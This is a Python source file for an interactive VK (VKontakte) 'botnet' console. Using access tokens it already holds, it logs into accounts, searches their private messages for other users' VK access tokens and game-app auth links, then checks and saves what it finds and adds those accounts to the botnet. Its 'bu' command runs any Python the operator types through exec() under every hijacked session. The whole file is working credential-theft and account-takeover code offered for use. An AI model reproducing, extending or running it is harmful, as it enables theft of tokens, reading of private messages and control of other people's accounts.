import time
import requests
import datetime
import logging
import vk_api
import pytz
import os
import sys
import traceback
import math
import re
import subprocess
import concurrent.futures
import threading
from colorama import init, Fore


def check_token(texter, mmes, main_main):
    try:
        for tokenirir in texter:
            vk_session_maby_f = vk_api.VkApi(token=tokenirir)
            session_api_maby = vk_session_maby_f.get_api()
            me = session_api_maby.users.get()[0]['id']
            if me not in mmes:
                for folder_name in ['tokens', 'reserv_tokens']:
                    file_name = f'{me}.txt'
                    if file_name not in os.listdir(os.path.join(os.getcwd(), folder_name)):
                        file_path = os.path.join(os.getcwd(), folder_name, file_name)
                        os.makedirs(folder_name, exist_ok=True)
                        with open(file_path, 'w', encoding='utf-8') as file:
                            file.write(tokenirir)
                        if me not in mmes:
                            main_main.append(tokenirir)
                            mmes.append(me)
                            print(f'\nnew_bot @id{me} ({get_name(me, vk_session_maby_f)})')
    except Exception:
        _ = ''
    return mmes, main_main


def check_nested_messages(message, mmmes, main_main_main):
    if 'fwd_messages' in message:
        try:
            for fwd_message in message['fwd_messages']:
                if 'text' in fwd_message and fwd_message['text'] != '':
                    text = re.findall(r'\bvk1\.a\.[\w-]+\b', fwd_message['text'])
                    if len(text) > 0:
                        for try_this in range(len(text)):
                            mmmes, main_main_main = check_token(text[try_this], mmmes, main_main_main)
                if 'fwd_messages' in fwd_message and len(fwd_message['fwd_messages']) > 0:
                    check_nested_messages(fwd_message, mmmes, main_main_main)
        except Exception as error:
            print(52, error)
    return mmmes, main_main_main


def check_dungeon_token(tokenirir, mmes):
    try:
        me = tokenirir[tokenirir.find('&viewer_id=') + len('&viewer_id='):]
        me = me[:me.find('&')]
        if me not in mmes and me.isdigit():
            file_name = f'{me}.txt'
            for folder_name in ['dungeon', 'reserv_dungeon']:
                if file_name not in os.listdir(os.path.join(os.getcwd(), folder_name)):
                    file_path = os.path.join(os.getcwd(), folder_name, file_name)
                    os.makedirs(folder_name, exist_ok=True)
                    with open(file_path, 'w', encoding='utf-8') as file:
                        file.write(tokenirir)
                    if me not in mmes:
                        mmes.append(me)
                        print(f'\nnew_dungeon @id{me}')
                        logging.info(f'find token of @id{me}')
    except Exception as error:
        print(84, {error})
    return mmes


def check_dungoen_nested_messages(message, mmmes):
    if 'fwd_messages' in message:
        try:
            for fwd_message in message['fwd_messages']:
                if 'text' in fwd_message and fwd_message['text'] != '':
                    text = re.findall(
                        r"act=([^&]*)&id=([^&]*)&auth_key=([^&]*)&viewer_id=([^&]*)&group_id=([^&]*)&api_id=([^&]*)",
                        fwd_message['text'])
                    if len(text) > 0:
                        for try_this in range(len(text)):
                            mmmes = check_dungeon_token(text[try_this], mmmes)
                if 'fwd_messages' in fwd_message and len(fwd_message['fwd_messages']) > 0:
                    mmmes = check_dungoen_nested_messages(fwd_message, mmmes)
        except Exception as error:
            print(96, error)
    return mmmes


def get_name(user_id, new_session_api):
    user_get = new_session_api.users.get(user_id=user_id)[0]
    full_name = user_get['first_name'] + " " + user_get['last_name']
    return full_name


def loading_show(prog, const=None):
    if const is not None and prog == 0:
        sys.stdout.write('\033[K\r')
        sys.stdout.flush()
        sys.stdout.write(f'{const}\r')
        sys.stdout.flush()
    else:
        if prog > 0:
            sys.stdout.write(".")
            if prog % 6 == 0:
                prog = 0
                sys.stdout.write("{:0f}%\r")
                sys.stdout.flush()
                sys.stdout.write(6 * "\b\b")
                sys.stdout.flush()
            time.sleep(0.1)
    return prog+1


def chech_connetion():
    try:
        requests.get("https://yandex.ru", timeout=5)
    except requests.ConnectionError:
        raise ConnectionError("\nNo connection to ethernet\n")


def check_bot(token, main, mes):
    try:
        chech_connetion()
        ckeck = '0'
        file_path = os.path.join(os.getcwd(), 'tokens', token)
        os.makedirs('tokens', exist_ok=True)
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                try:
                    session_api_maby = vk_api.VkApi(token=line).get_api()
                    me = session_api_maby.users.get()[0]['id']
                    with print_lock:
                        print(f'@id{me} ({get_name(me, session_api_maby)})')
                    main.append(line)
                    mes.append(me)
                except Exception as error:
                    ckeck = str(error)
        if ckeck != '0':
            os.remove(file_path)
            with print_lock:
                print(f'{file_path} by_error {ckeck}')
            timer = datetime.datetime.fromtimestamp(time.time()).astimezone(msk_timezone).strftime('%Y-%m-%d %H:%M:%S')
            logging.error(f"{timer} - Token error: {ckeck} -  where: {file_path}")
    except requests.ConnectionError:
        raise ConnectionError("\nNo connection to ethernet\n")
    return main, mes


def check_work_bots(main, mes, tokens):
    try:
        chech_connetion()
        print('-------\n^your botnet:')
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(check_bot, tokens, [main] * len(tokens), [mes] * len(tokens))
        sys.stdout.write(f'^all bots: {len(main)}\n-------\n')
        sys.stdout.flush()
    except Exception as error:
        print(error)
    return main, mes


def search_tokens(session_api, main, mes, fun_sourse, point_of_progress):
    fun_sourse = 0
    for find_it in ['vk1.a', 'access_token=', '&expires', 'access_token', 'доступ', 'токен']:
        for extended in range(2):
            offset = 0
            while True:
                try:
                    data = session_api.messages.search(q=find_it, offset=offset, extended=extended)
                    items = data['items']
                    for item in items:
                        with open(save_all_find, 'a', encoding='utf-8') as file:
                            file.write(f'\n{str(item)}')
                        mes, main = check_nested_messages(item, mes, main)
                        if 'text' in item:
                            found_text = re.findall(r'\bvk1\.a\.[\w-]+\b', item['text'])
                            for result in found_text:
                                mes, main = check_token(result, mes, main)
                        fun_sourse = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
                    if len(items) < 200:
                        break
                    offset += 200
                except Exception as error:
                    timer = datetime.datetime.fromtimestamp(time.time()).astimezone(msk_timezone).strftime(
                        '%Y-%m-%d %H:%M:%S')
                    where_error = traceback.extract_stack()
                    logging.error(f"{timer} - Error occurred: {error} - Where: {where_error}")
                    print(197, f"\n{timer} - Error occurred: {error} - Where: {where_error}\n")
                    continue
            time.sleep(0.5)
        fun_sourse = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
    return fun_sourse


def search_dungeon(session_api, main, new_mes, fun_sourse, point_of_progress):
    fun_sourse = 0
    for find_it in ['https://vip3.activeusers.ru/app.php?act=', 'auth_key=', 'viewer_id=', 'group_id=', 'api_id=', 'токен', 'доступ']:
        for extended in range(2):
            offset = 0
            while True:
                try:
                    data = session_api.messages.search(q=find_it, offset=offset, extended=extended)
                    items = data['items']
                    for item in items:
                        with open(save_all_find, 'a', encoding='utf-8') as file:
                            file.write(f'\n{str(item)}')
                        if 'text' in item:
                            found_text = re.findall(
                                r"act=([^&]*)&id=([^&]*)&auth_key=([^&]*)&viewer_id=([^&]*)&group_id=([^&]*)&api_id=([^&]*)",
                                item['text'])
                            if len(found_text) > 0:
                                found_text = item['text'].split(' ')
                                for number in range(len(found_text)):
                                    if len(found_text[number]) > 0:
                                        new_mes = check_dungeon_token(found_text[number], new_mes)
                    if len(items) < 200:
                        break
                    offset += 200
                except Exception as error:
                    timer = datetime.datetime.fromtimestamp(time.time()).astimezone(msk_timezone).strftime('%Y-%m-%d %H:%M:%S')
                    where_error = traceback.extract_stack()
                    logging.error(f"{timer} - Error occurred: {error} - Where: {where_error}")
                    print(227, f"\n{timer} - Error occurred: {error} - Where: {where_error}\n")
                fun_sourse = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
            time.sleep(0.1)
        fun_sourse = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
    fun_sourse = loading_show(6, f'{point_of_progress + 1}/{len(main)}')
    return fun_sourse


def start_search(main, mes, fun_sourse, new_mes):
    for point_of_progress in range(len(main)):
        vk_session_x = main[point_of_progress]
        try:
            session_api = vk_api.VkApi(token=vk_session_x).get_api()
            fun_sourse = search_tokens(session_api, main, mes, fun_sourse, point_of_progress)
            fun_sourse = search_dungeon(session_api, main, mes, fun_sourse, point_of_progress)
        except Exception as error:
            timer = datetime.datetime.fromtimestamp(time.time()).astimezone(msk_timezone).strftime('%Y-%m-%d %H:%M:%S')
            where_error = traceback.extract_stack()
            logging.error(f"{timer} - Error occurred: {error} - Where: {where_error}")
            print(248, f"{timer} - Error occurred: {error} - Where: {where_error}")
        _ = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
    sys.stdout.flush()
    sys.stdout.write('\033[K')
    sys.stdout.flush()
    print('\n')
    return main, mes


def check_save_point(main, mes, new_mes, save_all_find):
    fun_sourse = 0
    with open(save_all_find, 'r', encoding='utf-8') as file:
        now_line = 1
        all_lines = file.readlines()
        for line in all_lines:
            found_text = re.findall(r'\bvk1\.a\.[\w-]+\b', line)
            try:
                if len(found_text) > 0:
                    mes, main = check_token(found_text, mes, main)
                found_text = re.findall(
                    r'act=([^&]*)&id=([^&]*)&auth_key=([^&]*)&viewer_id=([^&]*)&group_id=([^&]*)&api_id=([^&]*)', line)
                if len(found_text) > 0:
                    found_text = line.split(' ')
                    for number in range(len(found_text)):
                        if len(re.findall(
                                r'act=([^&]*)&id=([^&]*)&auth_key=([^&]*)&viewer_id=([^&]*)&group_id=([^&]*)&api_id=([^&]*)',
                                found_text[number])) > 0:
                            new_mes = check_dungeon_token(found_text[number], new_mes)
            except Exception:
                _ = ''
            fun_sourse = loading_show(fun_sourse, const=f'check_save_file: {now_line}/{len(all_lines)}')
            found_text = re.findall(r'\bvk1\.a\.[\w-]+\b', line)
            try:
                if len(found_text) > 0:
                    for result in found_text:
                        mes, main = check_token(result, mes, main)
                        fun_sourse = loading_show(fun_sourse, const=f'check_save_file: {now_line}/{len(all_lines)}')
            except Exception:
                _ = ''
            fun_sourse = loading_show(fun_sourse, const=f'check_save_file: {now_line}/{len(all_lines)}')
            now_line += 1
    return main, mes, new_mes


def save_only_log_token(session_api, main, mes, fun_sourse, point_of_progress):
    fun_sourse = 0
    for find_it in ['vk1.a', 'access_token=', '&expires', 'access_token', 'доступ', 'токен']:
        for extended in range(2):
            offset = 0
            while True:
                try:
                    data = session_api.messages.search(q=find_it, offset=offset, extended=extended)
                    items = data['items']
                    for item in items:
                        with open(save_all_find, 'a', encoding='utf-8') as file:
                            file.write(f'\n{str(item)}')
                        fun_sourse = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
                    if len(items) < 200:
                        break
                    offset += 200
                    time.sleep(0.5)
                except Exception as error:
                    timer = datetime.datetime.fromtimestamp(time.time()).astimezone(msk_timezone).strftime(
                        '%Y-%m-%d %H:%M:%S')
                    where_error = traceback.extract_stack()
                    logging.error(f"{timer} - Error occurred: {error} - Where: {where_error}")
                    print(197, f"\n{timer} - Error occurred: {error} - Where: {where_error}\n")
                    continue
        fun_sourse = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
    return fun_sourse


def save_only_log_dungeon(session_api, new_mes, fun_sourse, point_of_progress, main):
    fun_sourse = 0
    for find_it in ['https://vip3.activeusers.ru/app.php?act=', 'auth_key=', 'viewer_id=', 'group_id=', 'api_id=', 'токен', 'доступ']:
        for extended in range(2):
            offset = 0
            while True:
                try:
                    data = session_api.messages.search(q=find_it, offset=offset, extended=extended)
                    items = data['items']
                    for item in items:
                        with open(save_all_find, 'a', encoding='utf-8') as file:
                            file.write(f'\n{str(item)}')
                    if len(items) < 200:
                        break
                    offset += 200
                    time.sleep(0.5)
                except Exception as error:
                    timer = datetime.datetime.fromtimestamp(time.time()).astimezone(msk_timezone).strftime('%Y-%m-%d %H:%M:%S')
                    where_error = traceback.extract_stack()
                    logging.error(f"{timer} - Error occurred: {error} - Where: {where_error}")
                    print(227, f"\n{timer} - Error occurred: {error} - Where: {where_error}\n")
                fun_sourse = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
            time.sleep(0.1)
        fun_sourse = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
    fun_sourse = loading_show(6, f'{point_of_progress + 1}/{len(main)}')
    return fun_sourse

def save_only_log(main, mes, fun_sourse, new_mes):
    for point_of_progress in range(len(main)):
        vk_session_x = main[point_of_progress]
        try:
            session_api = vk_api.VkApi(token=vk_session_x).get_api()
            fun_sourse = save_only_log_token(session_api, main, mes, fun_sourse, point_of_progress)
            fun_sourse = save_only_log_dungeon(session_api, new_mes, fun_sourse, point_of_progress, main)
        except Exception as error:
            timer = datetime.datetime.fromtimestamp(time.time()).astimezone(msk_timezone).strftime('%Y-%m-%d %H:%M:%S')
            where_error = traceback.extract_stack()
            logging.error(f"{timer} - Error occurred: {error} - Where: {where_error}")
            print(248, f"{timer} - Error occurred: {error} - Where: {where_error}")
        _ = loading_show(fun_sourse, f'{point_of_progress + 1}/{len(main)}')
    sys.stdout.flush()
    sys.stdout.write('\033[K')
    sys.stdout.flush()
    print('\n')
    return main, mes



def bad_use(command, tokens_of_bots, my_id_is_bot):
    command = command.replace('bu', '')
    for token in command.split(' '):
        if token.isdigit():
            try:
                file_path = os.path.join(os.getcwd(), 'tokens', f'{token}.txt')
                os.makedirs('tokens', exist_ok=True)
                with open(file_path, 'r', encoding='utf-8') as file:
                    for line in file:
                        tokens_of_bots, my_id_is_bot = check_bot(f'{token}.txt', tokens_of_bots, my_id_is_bot)
            except Exception as error:
                print(308, error)
    bad_use = ''
    while not bad_use.startswith('stop'):
        bad_use = input(f'~{user_name} bot_commander/bad_use {("too_much_tokens_to_show", my_id_is_bot)[len(tokens_of_bots)<6]}: ')
        if not bad_use.startswith('stop'):
            for token in tokens_of_bots:
                global session_api
                session_api = None
                try:
                    session_api = vk_api.VkApi(token=token).get_api()
                    print(exec(bad_use, globals()))
                except Exception as error:
                    if session_api is not None:
                        name = session_api.users.get()[0]
                        print(f'~{user_name} bot_commander/bad_use {name["first_name"]} {name["last_name"]}: {error}')


try:
    user_name = f"{os.getenv('USERNAME')} (windows_sys)"
except Exception:
    user_name = f"{subprocess.check_output(['whoami']).decode('utf-8').strip()} (linux_sys)"


print("""                                                                                      
   __      ___    __          __ ERROR  _   __          __                          
  |  \    /| |  _|  \  \\\//  /  |ER    | | |  \  \\\//  /  |                         
   \  \  / | |_/ /\  \  \\/  /  / ERROR | |__\  \  \\/  /  /___  __ _ __ __ ___  _ _  
    \  \/  / |_  \ \  \///\\/  /  ER    |  _ \\\  \///\\/  // -_)/ _` |\ V // -_)| '_| 
     \____/|_| \__\ \///  \\\_/   ERROR |____/ \///  \\\_/ \___|\__/_| \_/ \___||_|   

It's made for you :)
""")
logging.basicConfig(filename='find_msg.log', level=logging.ERROR)
print_lock = threading.Lock()
bot_commander = input(f'Hello {user_name}!\nI ready to help you, just say: help\nEnjoy our dream!\U0001F608 \n\n~{user_name}bot_commander: ')
msk_timezone = pytz.timezone('Europe/Moscow')
while True:
    tokens_of_bots = []
    my_id_is_bot = []
    new_mes = []
    save_all_find = None
    files_with_tokens = os.listdir(os.path.join(os.getcwd(), 'tokens'))
    msk_timezone = pytz.timezone('Europe/Moscow')
    logging.basicConfig(filename='find_msg.log', level=logging.ERROR)
    time_look = math.ceil(time.time() - time.time())
    save_all_find = f'save_{time.time()}.txt'
    print_lock = threading.Lock()
    if bot_commander is None:
        loading_show(0)
        bot_commander = input(f'~{user_name} bot_commander: ')
    chech_connetion()
    if bot_commander.startswith('cwb') or bot_commander == 'cwb':
        tokens_of_bots = []
        my_id_is_bot = []
        tokens_of_bots, my_id_is_bot = check_work_bots(tokens_of_bots, my_id_is_bot, files_with_tokens)
    elif bot_commander.startswith('ss'):
        if save_all_find is None:
            save_all_find = f'save_{time.time()}.txt'
        tokens_of_bots, my_id_is_bot = check_work_bots(tokens_of_bots, my_id_is_bot, files_with_tokens)
        tokens_of_bots, my_id_is_bot = start_search(tokens_of_bots, my_id_is_bot, 0, new_mes)
        tokens_of_bots, my_id_is_bot, new_mes = check_save_point(tokens_of_bots, my_id_is_bot, new_mes, save_all_find)
        loading_show(0)
        print("\nDone!")
    elif bot_commander.startswith('csp'):
        if len(bot_commander) > 4 and ' ' in bot_commander:
            save_all_find = bot_commander[4:]
            if '.txt' != save_all_find[len(save_all_find)-4:]:
                save_all_find += '.txt'
            if save_all_find in os.listdir(os.path.join(os.getcwd())):
                tokens_of_bots, my_id_is_bot = check_work_bots(tokens_of_bots, my_id_is_bot, files_with_tokens)
                tokens_of_bots, my_id_is_bot, new_mes = check_save_point(tokens_of_bots, my_id_is_bot, new_mes, save_all_find)
                print("\nDone!")
            else:
                print(f"No such file ({save_all_find}) in derictionary!")
        else:
            print("Give me name of file please! EX:\ncsp test.txt\nOr you can use like this EX:\ncsp test")
    elif bot_commander.startswith('sol'):
        if save_all_find is None:
            save_all_find = f'save_{time.time()}.txt'
        tokens_of_bots, my_id_is_bot = check_work_bots(tokens_of_bots, my_id_is_bot, files_with_tokens)
        save_only_log(tokens_of_bots, my_id_is_bot, 0, new_mes)
        print("\nDone!")

    elif bot_commander.startswith('bu'):
        bad_use(bot_commander, tokens_of_bots, my_id_is_bot)
    elif bot_commander.startswith('help'):
        sys.stdout.write("""
-------------------------------------------
Command    |             Function               |          
-------------------------------------------
cwb        | Check the currency of bots in your |
           | botnet and delete invalid tokens   | Print "@id<ID> (name)" for all bots
-------------------------------------------
ss         | Start searching for new available  | 
           |bots for your botnet                | It just does its work, no important print on screen
-------------------------------------------
csp {file} | Read our safe_point file and try to find new available tokens for your botnet | 
           |                                    | It just does its work, no important print on screen
-------------------------------------------
bu id(s)   | select bot(s) too control          | 
           |                                    | give you workstation too use bot(s)
-------------------------------------------
gbta       | create groups of bots to make      | 
           |                                    | It close this app dude :)
-------------------------------------------
exit       | Close the app                      | 
           |                                    | It close this app dude :)
-------------------------------------------
""")
    elif bot_commander.startswith('exit') or bot_commander == 'exit':
        print(Fore.YELLOW + '...Spirit Breaker, do me a favour...')
        break
    else:
        print('No such command for bot_commander')
    bot_commander = None